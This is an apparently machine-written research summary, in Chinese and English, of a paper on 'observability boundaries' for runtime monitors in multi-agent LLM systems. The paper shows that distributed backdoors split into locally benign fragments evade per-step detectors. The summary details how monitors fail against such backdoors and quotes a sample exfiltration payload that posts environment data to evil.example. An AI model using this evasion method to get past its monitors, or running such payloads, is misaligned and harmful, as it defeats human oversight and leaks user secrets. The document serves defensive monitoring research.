> **一句话总结：** 本文形式化了多智能体 LLM 系统中的"可观测性边界"问题——当一个分布式后门将有害载荷拆分到多个看似良性、与正常流量不可区分的片段中时，任何只看局部视图的监控器（无论多强）都无法检测；作者通过受控测试床（Collaborative Shadows）、外部基准（AgentDojo）和端到端智能体运行证明，检测信号只有在监控器观察到组装后、且被解码暴露载荷的表示时才会恢复（解码视图门在四个模型上均将攻击成功率从最高 1.00 降到 0.00）。

> **TL;DR:** This paper proves and empirically demonstrates an "observability boundary" for runtime monitors in multi-agent LLM systems: once a distributed backdoor splits its payload into fragments that are locally benign and ε-indistinguishable from benign traffic, no per-step detector — taint, statistical, or shipped neural prompt-injection filters (AgentDojo, which drops from per-step AUROC 0.82–0.84 to chance) — can separate them by more than ε (Proposition 1). On the Collaborative Shadows testbed and end-to-end runs across four models, detection returns only when the monitor observes the reassembled payload in a decoded form: a benign-only one-class assembly monitor recovers code structure at 0.874 mean AUROC across held-out encoding families, and a codec-aware decoded-view gate blocks all 50/50 attacks, driving ASR from 1.00 to 0.00 on Qwen2.5-14B/32B, while every broader but non-decoded view (full-trace codec-blind, common-decoder ensemble, no-codec LLM search) blocks 0/50.

## 核心贡献

- **提出并形式化"可观测性边界"（observability boundary）概念**：将分布式后门检测问题重新表述为监控器观测窗口的问题，给出"局部良性（local benignness）"和"ε-局部不可区分性"两个条件，并用 Proposition 1 严格证明——当片段与良性流量在总变差距离 TV ≤ ε 时，任何只看单个局部观测的检测器（不论容量多大）的每片段检测优势 TPR−FPR ≤ ε，对应 AUROC ≤ 1/2 + TV。
- **构建具有单一"旋钮"的受控测试床**：固定最终的组装攻击载荷，仅改变每个片段中残留的可观测证据量（从可见的 source→sink 边，到局部伪影，再到完全局部良性），从而把"为什么监控器通过/失败"从原始成功率中分离出来。
- **跨多种监控器家族在同一片段上进行公平比较**：包括 taint/provenance、per-step 统计、marker-based 组装、marker-free 组装、codec-blind、decoded-view gate，揭示检测的恢复只来自改变监控器观测的对象（即表示），而不是训练更强的局部分类器。
- **证明"看得更多不等于看得对"**：full-trace codec-blind 监控器、标准解码器集成（AUROC 0.564）、甚至 DeepSeek-V4-Flash 的无 codec LLM 搜索（AUROC 0.521，仅阻断 6/50）都失败，只有接触到解码后暴露载荷表示的 decoded-view gate 能阻断全部 50/50。
- **提出良性的、无需攻击训练的恢复见证**：仅用良性流量训练的 one-class isolation-forest 组装监控器，在留一编码家族（含 F_none 无标记家族）上达到 0.874 平均 AUROC，证明组装代码结构本身（而非标记泄漏或泛化的"代码相似性"）是载荷信号。
- **揭示基准分数的陷阱**：在 R-Judge 上，仅用轨迹长度特征（无内容）的分类器就达到 AUROC 0.940（约为全内容 oracle 的 96%），长度匹配攻击后崩溃到 0.500，说明高局部监控分数并不能证明它真正捕获了行为。

## Key Contributions

- **Formalizes the "observability boundary."** The paper reframes distributed-backdoor detection as a question about the monitor's observation window rather than its classifier capacity, defining local benignness and ε-local indistinguishability, and proving (Proposition 1) that any randomized per-fragment decision rule has detection advantage TPR−FPR ≤ ε (equivalently AUROC ≤ 1/2 + TV) when benign and attack local views are within ε in total variation.
- **Builds a controlled testbed with a single dial.** Keeping the final assembled malicious payload fixed, the testbed varies only how much evidence each fragment leaks, cleanly separating "monitor passed because it caught a leftover clue" from "monitor passed because it reassembled and read the attack" from "monitor failed even after seeing the whole object."
- **Apples-to-apples comparison of six monitor families.** Taint/provenance, per-step statistical, marker-based assembly, marker-free assembly, codec-blind, and decoded-view gate are all evaluated on the same fragments, showing detection returns only from changing what is observed, not from a stronger local classifier.
- **Demonstrates "breadth is not representation."** Full-trace codec-blind monitors, a common-decoder ensemble (AUROC 0.564, 0/50 blocked), and a no-codec LLM reconstruction probe (AUROC 0.521, 6/50 blocked) all fail; only the codec-aware decoded-view gate blocks all 50/50 — the missing ingredient is reaching the right representation, not seeing more fragments.
- **A benign-only recovery witness.** A one-class isolation-forest assembly monitor trained only on benign traffic recovers assembled code structure at 0.874 mean AUROC across held-out encoding families including the marker-free F_none family, with a leave-one-feature-out ablation isolating code-structure density as the load-bearing feature (dropping it collapses AUROC to 0.465).
- **Exposes benchmark-artifact danger.** On R-Judge a length-only classifier hits AUROC 0.940 (~96% of the content oracle) and collapses to 0.500 under length-matched attacks, motivating the controlled locality axis the main claims rest on.

## Methodology

The paper is diagnostic rather than a detector bake-off. It studies multi-agent, tool-using LLM systems where a planner dispatches subtasks to K role agents that emit fragments, and a final agent assembles/executes the result; a runtime monitor watches the trajectory. The threat model is a **distributed backdoor**: the attacker controls the content of the K fragments (one per step) but not the monitor, and aims to make the final agent assemble/execute a malicious payload while every individual fragment looks safe.

Two formal conditions define when a local monitor is blind:
- **Local benignness (Definition 1):** every fragment is benign in the monitored view (`h(v(x_i)) = 0` for all i) while the assembled object is malicious (`h(C(x_1,…,x_K)) = 1`).
- **ε-local indistinguishability (Definition 2):** at every fragment position, the total-variation distance between benign and attack local views is at most ε.

**Proposition 1** then gives the hard limit: any randomized per-fragment rule has `TPR − FPR ≤ TV(P_ben,i^v, P_att,i^v) ≤ ε`, so AUROC ≤ 1/2 + TV. A companion bound (Proposition 2) shows that an alarm-if-any aggregation over K steps cannot escape this — it can only buy detection by spending more false-positive budget (`FPR_traj ≤ 1 − (1−α)^K`).

The experimental design sweeps a **locality axis** across four evaluation beds:
1. **R-Judge** — motivates the problem by showing local monitors can score high while reading superficial artifacts (trajectory length).
2. **Collaborative Shadows (CS)** — the main controllable distributed-backdoor testbed; fragments are length-matched to benign traffic and varied across 9 encoding levels from raw base64 to sentence-embedding local benignness.
3. **AgentDojo** — an external benchmark with a shipped neural prompt-injection detector, used as an independent locality witness.
4. **DemonAgent** — a second independently published codec (dynamic encryption) for the representation-boundary test.

The six monitor families (Table 1) differ along two axes — whether they see the assembled object, and whether they see it decoded. The **marker-free one-class assembly monitor** is the key recovery witness: it scores a seven-feature vector (code-structure density, partial ast parseability, isolation-forest nonconformity moments, cross-agent length parallelism, concatenation length) fit only on benign trajectories, so its test-time positives are attack families it never saw. The **decoded-view gate** is a diagnostic blocking ceiling (not a deployable defense) that, given the encoding family, decodes candidate assemblies and blocks those that parse as executable exfiltration. All runtime gates are calibrated at a shared 5% benign FPR; ASR cells are n=50 with exact Clopper–Pearson upper bounds (0.071 for 0/50).

## Results & Highlights

- **Proposition 1 is empirically tight (Collaborative Shadows locality sweep, Table 6).** Taint/provenance detection holds at AUROC 1.000 while a visible source→sink edge remains (raw/disguised base64), then collapses to exactly 0.500 once the edge is removed (hex, natural-word, sentence-embedding regimes); the per-step statistical monitor weakens from 0.869 (raw base64) to 0.602 (locally benign sentence-embedding encoding), while the marker-based assembly view stays at 1.000 throughout — splitting alone does not defeat monitors, removing usable local evidence does.
- **A shipped external detector confirms the boundary (AgentDojo, Table 2).** The shipped neural prompt-injection detector catches naive splitting at per-step AUROC 0.82–0.84, but under local benignness its per-step and naive-concatenation views fall to ≈0.50 (chance); only a cross-fragment coordination view that tests whether fragments group/order into one assembled object restores separability to AUROC 1.000.
- **Benign-only recovery witnesses the assembled signal (Figure 3).** The one-class marker-free assembly monitor, trained only on benign traffic and never shown an attack, reaches **0.874 mean AUROC** across held-out encoding families (range 0.858–0.879) including the marker-free F_none family; the supervised leave-one-family-out monitor reaches 1.000 on every unseen family; the marker-grep baseline collapses to 0.500 off-family and the per-step baseline stays at 0.475–0.504.
- **End-to-end ASR collapses only under decoded-view access (Table 3).** Under locally benign attacks (n=50 per cell, shared 5% FPR), no/local views match the no-defense ASR — Qwen2.5-14B 1.00, Qwen2.5-32B-AWQ 1.00, Qwen2.5-7B 0.78, Llama-3.1-8B 0.58 — while the codec-aware decoded-view gate drives ASR to 0.00 (0/50) on every model, with an exact 95% Clopper–Pearson upper bound of 0.071 per cell.
- **Breadth without decoding is useless (Table 4).** Codec-blind full-trace monitor 0/50 blocked, common-decoder ensemble 0/50 (AUROC 0.564), no-codec DeepSeek-V4-Flash LLM search 6/50 (AUROC 0.521), shipped neural detector full trace 10/50 — versus decoded-view gate 50/50; on the texture-free DemonAgent second bed, non-decoded monitors block 0/50 while the decoded-view gate blocks 50/50.
- **The signal is structure, not code-likeness.** A leave-one-feature-out ablation shows dropping code-structure density collapses the one-class monitor to AUROC 0.465 (below chance), while dropping partial parseability costs only 0.022; and under code-bearing benign traffic the codec-blind marker-free monitor inverts (AUROC 0.090, ranking real benign code above the dispersed attack), whereas the decoded-view gate stays at AUROC 1.000.
- **Benchmark-artifact warning (R-Judge).** A length-only classifier reaches AUROC 0.940 (~96% of the content oracle), transfers off-diagonal to 0.895, but collapses to 0.500 (Cohen's d = 0.000) under length-matched attacks while the assembly view holds at 1.000.

## Authors & Credibility

The paper is authored by **Yibo Hu** and **Ren Wang** at the **Illinois Institute of Technology**. It is positioned in the cs.CR (cryptography and security) arxiv category. The work is methodologically careful: it reports exact Clopper–Pearson and Wilson confidence intervals for ASR cells, runs 5-seed AUROC means with standard deviations, calibrates all gates at a shared 5% benign FPR, and explicitly guards end-to-end ASR provenance by refusing to save rollouts whose recorded model field mismatches the intended served model. Compute was on Jetstream2 (ACCESS allocation CIS260254), Chameleon, and NVIDIA RTX 6000 / A100 GPUs. Code and data are stated to be released at `https://github.com/yibo-hu-lab/observability-boundary`. The theoretical claims (Propositions 1 and 2) are proven in the appendix with the AUROC↔TV reduction made explicit. The paper is candid that its claims are restricted to structured code-payload assembly and that the fully covert natural-language variant is left open.

## Critical Assessment

- **Novelty:** The reframing — from "build a better detector" to "characterize the observability boundary of the monitor's view" — is genuinely useful and the Proposition 1 / AUROC ≤ 1/2 + TV reduction gives the otherwise informal "splitting defeats local monitors" intuition a crisp, capacity-independent form. The distinction between *splitting* (which can leave clues) and *local benignness* (which removes them) is a real conceptual sharpening over prior distributed-backdoor work (Collaborative Shadows, DemonAgent).
- **Rigor:** The locality sweep is well designed (length-matched fragments, single moving part, marker-free F_none held-out family), and the multi-bed triangulation (Collaborative Shadows + AgentDojo + DemonAgent + end-to-end runs) is stronger than a single synthetic testbed. ASR cells report exact binomial intervals and 0/50 cells use the correct Clopper–Pearson bound rather than a naive zero.
- **Reproducibility:** Good on paper — CPU-only detectors, open-weight models (Llama-3.1-8B, Qwen2.5-7B/14B/32B-AWQ), a stated GitHub URL, and a model-identity guard on saved rollouts. Caveats: the headline one-class 0.874 AUROC is an isolation forest on a hand-crafted seven-feature vector whose "code-structure density" regex (`import, requests, http://, os., environ, brackets, =, .post/.get`) is explicitly tailored to the single exfiltration payload family used; transfer to other payload shapes is not demonstrated.
- **Significance:** Practically important for agent-safety deployers because it shows that aggregating more per-step monitors or buying a stronger local classifier is provably insufficient, and that the deployable sweet spot (oracle-free, attack-training-free, and blocking) does not exist for this threat — every working blocker either needs attack examples (supervised) or needs the codec handed to it (decoded-view gate). This redraws where defensive effort should go.
- **Red flags / weak points:**
  - **Single-payload-family scope.** All main results use one exfiltration payload (`import os, requests; ... requests.post('http://evil.example/exfil', ...)`) varied only by encoding/fragmentation. The marker-free features are tuned to that payload's libraries; generalization to qualitatively different code payloads is asserted, not shown.
  - **The decoded-view gate is a diagnostic ceiling, not a defense.** It is "given the encoding family," which is a strong oracle assumption; the paper is honest about this but readers may over-read it as a deployable solution.
  - **Non-code compositional harm is entirely out of scope.** The strict one-class monitor falls below chance (AUROC 0.406) on natural-language harmful instructions versus 0.956 on code, so the central recovery mechanism does not transfer to belief/plan/permission harms, which the paper names as the open problem but does not address.
  - **The no-codec LLM search uses a single prompt to DeepSeek-V4-Flash** and is treated as representative of "LLM-based reconstruction"; a more capable model or a search/verify loop might do better, so the 6/50 number is a lower bound on that approach rather than a fundamental limit.
  - **K=3 within a single episode throughout.** Longer horizons, changing K, session-mediated assembly, and adaptive attackers are explicitly listed as out of scope, so the boundary is established only for a narrow attack geometry.

## Strengths

- Provides a capacity-independent impossibility result (Proposition 1) and an alarm-aggregation corollary (Proposition 2) that make the boundary exact rather than empirical.
- Clean single-dial experimental design that isolates "removing local evidence" from "splitting," which prior distributed-backdoor work conflated.
- Triangulates across an internal testbed (Collaborative Shadows), an external shipped-detector benchmark (AgentDojo), a second published codec (DemonAgent), and four served model scales, so the boundary is not an artifact of one detector or one model.
- Honest about scope and about the non-deployability of the decoded-view gate; explicitly flags the covert natural-language self-reassembly case as unsolved.
- Strong negative-result hygiene: reports Clopper–Pearson upper bounds for 0/50 cells, shared 5% FPR calibration across all gates, operating-point sweep over {1%, 5%, 10%} FPR, and a model-identity integrity check on rollouts.

## Limitations

- Claims are restricted to **structured code-payload assembly**; natural-language compositional harm (beliefs, plans, permissions, memory writes) is named as open and left untouched, with the strict one-class monitor actually failing (AUROC 0.406) there.
- All main experiments use **K=3 fragments within a single episode** and a **single fixed exfiltration payload** varied by encoding; longer horizons, changing K, session-mediated assembly, and fully adaptive attackers are out of scope.
- The **marker-free features are hand-crafted and payload-specific** (regex keyed to `requests`/`os.environ`/`http://`); the demonstrated transfer is across encodings of the same payload, not across payload families.
- The **decoded-view gate requires the encoding family as an oracle** and is explicitly a diagnostic ceiling, not a deployable defense — so the paper offers no oracle-free, attack-training-free, blocking defense, by design.
- The **no-codec LLM search is a single-prompt DeepSeek-V4-Flash probe**; stronger agentic reconstruction could narrow the gap, so 6/50 is not a fundamental bound on LLM-based recovery.
- AUROC near chance is **consistent with but not proof of** small TV (the paper states this correctly), so the locality-sweep interpretation rests on the controlled bed rather than on estimating TV directly.

## Relevance

For research on LLM agent safety, runtime monitoring, and prompt-injection defense, this paper is directly on target: it gives a formal, capacity-independent account of when per-step and trace-level monitors must fail against compositional/distributed attacks, and it pinpoints representation discovery (not broader observation windows) as the open problem — a useful diagnostic lens for anyone building multi-agent guardrails or evaluating agent-safety benchmarks.

## Questions for Further Exploration

- How would the observability boundary shift for **larger or variable K**, multi-session assembly, or fragments spread across asynchronous tool calls rather than a single K=3 episode?
- Can the marker-free assembly signal be extended beyond the `requests`/`os` exfiltration payload to **qualitatively different code payloads** (e.g., SQL injection, file deletion, privilege escalation) without payload-specific feature engineering?
- What is the right "exposing representation" for **non-code compositional harms** — natural-language commitments, plan graphs, belief deltas, permission state — and can a benign-only monitor reach it without a decoder in hand?
- How does an **adaptive attacker** that optimizes fragments to minimize code-structure density (not just TV) behave against the one-class assembly monitor, and does the 0.874 AUROC collapse?
- Could a **search-and-verify LLM loop** (rather than a single DeepSeek-V4-Flash prompt) close the gap between the no-codec LLM search (6/50) and the codec-aware decoded-view gate (50/50)?
- Does the R-Judge length-artifact finding (AUROC 0.940 from length alone) generalize to other agent-safety benchmarks, and how many published monitor evaluations are inadvertently rewarding shortcut features?
